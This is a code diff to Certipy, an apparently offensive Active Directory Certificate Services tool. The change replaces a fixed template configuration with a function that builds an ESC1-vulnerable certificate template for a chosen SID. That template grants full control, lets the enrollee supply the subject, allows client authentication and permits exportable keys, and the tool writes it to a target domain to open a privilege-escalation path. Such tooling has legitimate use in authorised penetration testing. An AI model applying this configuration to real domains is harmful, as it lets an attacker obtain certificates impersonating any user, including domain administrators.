@@ -27,7 +27,7 @@ from certipy.lib.constants import (
 from certipy.lib.files import try_to_save_file
 from certipy.lib.ldap import LDAPConnection, LDAPEntry
 from certipy.lib.logger import logging
-from certipy.lib.security import create_authenticated_users_sd
+from certipy.lib.security import create_sd
 from certipy.lib.target import Target
 from certipy.lib.time import (
     SECONDS_PER_WEEK,
@@ -57,47 +57,54 @@ PROTECTED_ATTRIBUTES = [
     "msPKI-Template-Minor-Revision",
 ]
 
-# ESC1 vulnerable template configuration with full control for 'Authenticated Users'
-# This configuration creates a template that allows any authenticated user to enroll
-# and obtain certificates with client authentication EKU
-CONFIGURATION_TEMPLATE = {
-    "showInAdvancedViewOnly": True,
-    # Security descriptor giving Authenticated Users full control
-    "nTSecurityDescriptor": create_authenticated_users_sd().getData(),
-    "flags": int(
-        TemplateFlags.PUBLISH_TO_DS
-        | TemplateFlags.EXPORTABLE_KEY
-        | TemplateFlags.AUTO_ENROLLMENT
-        | TemplateFlags.ADD_TEMPLATE_NAME
-        | TemplateFlags.IS_DEFAULT
-    ),  # Template flags
-    "pKIDefaultKeySpec": 2,  # AT_SIGNATURE
-    "pKIKeyUsage": b"\x86\x00",  # Digital Signature, Key Encipherment
-    "pKIMaxIssuingDepth": -1,  # Maximum depth value for the Basic Constraint extension (-1 means no limit)
-    "pKICriticalExtensions": [
-        "2.5.29.19",  # Basic Constraints
-        "2.5.29.15",  # Key Usage
-    ],  # Critical extensions
-    "pKIExpirationPeriod": span_to_filetime(SECONDS_PER_YEAR),  # 1 year validity
-    "pKIOverlapPeriod": span_to_filetime(SECONDS_PER_WEEK * 6),  # 6 week overlap
-    "pKIExtendedKeyUsage": [
-        OID_TO_STR_NAME_MAP["client authentication"],
-    ],
-    "msPKI-Certificate-Application-Policy": [
-        OID_TO_STR_NAME_MAP["client authentication"],
-    ],
-    "pKIDefaultCSPs": [
-        "2,Microsoft Base Cryptographic Provider v1.0",
-        "1,Microsoft Enhanced Cryptographic Provider v1.0",
-    ],
-    "msPKI-RA-Signature": 0,  # No recovery agent signatures required
-    "msPKI-Enrollment-Flag": int(EnrollmentFlag.NONE),  # No special enrollment flags
-    "msPKI-Private-Key-Flag": int(PrivateKeyFlag.EXPORTABLE_KEY),  # Allow export
-    "msPKI-Certificate-Name-Flag": int(
-        CertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT
-    ),  # Name flags
-    "msPKI-Minimal-Key-Size": 2048,  # Minimum 2048-bit key
-}
+
+def create_esc1_template(sid: str) -> dict[str, Any]:
+    """
+    ESC1 vulnerable template configuration with full control for the passed sid.
+    This configuration creates a template that allows `sid` to enroll
+    and obtain certificates with client authentication EKU.
+    """
+    return {
+        "showInAdvancedViewOnly": True,
+        # Security descriptor giving `sid` full control
+        "nTSecurityDescriptor": create_sd(sid).getData(),
+        "flags": int(
+            TemplateFlags.PUBLISH_TO_DS
+            | TemplateFlags.EXPORTABLE_KEY
+            | TemplateFlags.AUTO_ENROLLMENT
+            | TemplateFlags.ADD_TEMPLATE_NAME
+            | TemplateFlags.IS_DEFAULT
+        ),  # Template flags
+        "pKIDefaultKeySpec": 2,  # AT_SIGNATURE
+        "pKIKeyUsage": b"\x86\x00",  # Digital Signature, Key Encipherment
+        "pKIMaxIssuingDepth": -1,  # Maximum depth value for the Basic Constraint extension (-1 means no limit)
+        "pKICriticalExtensions": [
+            "2.5.29.19",  # Basic Constraints
+            "2.5.29.15",  # Key Usage
+        ],  # Critical extensions
+        "pKIExpirationPeriod": span_to_filetime(SECONDS_PER_YEAR),  # 1 year validity
+        "pKIOverlapPeriod": span_to_filetime(SECONDS_PER_WEEK * 6),  # 6 week overlap
+        "pKIExtendedKeyUsage": [
+            OID_TO_STR_NAME_MAP["client authentication"],
+        ],
+        "msPKI-Certificate-Application-Policy": [
+            OID_TO_STR_NAME_MAP["client authentication"],
+        ],
+        "pKIDefaultCSPs": [
+            "2,Microsoft Base Cryptographic Provider v1.0",
+            "1,Microsoft Enhanced Cryptographic Provider v1.0",
+        ],
+        "msPKI-RA-Signature": 0,  # No recovery agent signatures required
+        "msPKI-Enrollment-Flag": int(
+            EnrollmentFlag.NONE
+        ),  # No special enrollment flags
+        "msPKI-Private-Key-Flag": int(PrivateKeyFlag.EXPORTABLE_KEY),  # Allow export
+        "msPKI-Certificate-Name-Flag": int(
+            CertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT
+        ),  # Name flags
+        "msPKI-Minimal-Key-Size": 2048,  # Minimum 2048-bit key
+    }
+
 
 TRANSFORMERS = {
     "pKIOverlapPeriod": (filetime_to_span, span_to_filetime),
@@ -152,7 +159,7 @@ class Template:
         target: "Target",
         template: str = "",
         write_configuration: Optional[str] = None,
-        write_default_configuration: bool = False,
+        write_default_configuration: Optional[str] = None,
         save_configuration: Optional[str] = None,
         no_save: bool = False,
         force: bool = False,
@@ -166,7 +173,7 @@ class Template:
             target: Target domain information
             template: Name of the certificate template to operate on
             write_configuration: Path to configuration file to apply
-            write_default_configuration: Whether to apply the default configuration
+            write_default_configuration: Whether to apply the default ESC1 configuration (optionally with target SID)
             save_configuration: Path to save the current configuration
             no_save: Whether to skip saving the current configuration
             force: Do not prompt for confirmation before applying changes
@@ -387,8 +394,12 @@ class Template:
             except (FileNotFoundError, ValueError):
                 return False
         else:
+            # Only needed to make the typechecker pass. At this position in write_configuration,
+            # the options write_configuration_file and write_default_configuration are mutually
+            # exclusive so this should always pass.
+            assert self.write_default_configuration is not None
             # Use the default vulnerable configuration
-            new_configuration = CONFIGURATION_TEMPLATE
+            new_configuration = create_esc1_template(self.write_default_configuration)
 
         # Get the current configuration
         old_configuration = self.get_configuration(self.template_name)
@@ -553,8 +564,8 @@ def entry(options: argparse.Namespace) -> None:
     template = Template(target=target, **vars(options))
 
     will_write = (
-        template.write_default_configuration or template.write_configuration_file
-    )
+        template.write_default_configuration is not None
+    ) or template.write_configuration_file
 
     if template.save_configuration_file:
         template.save_configuration()
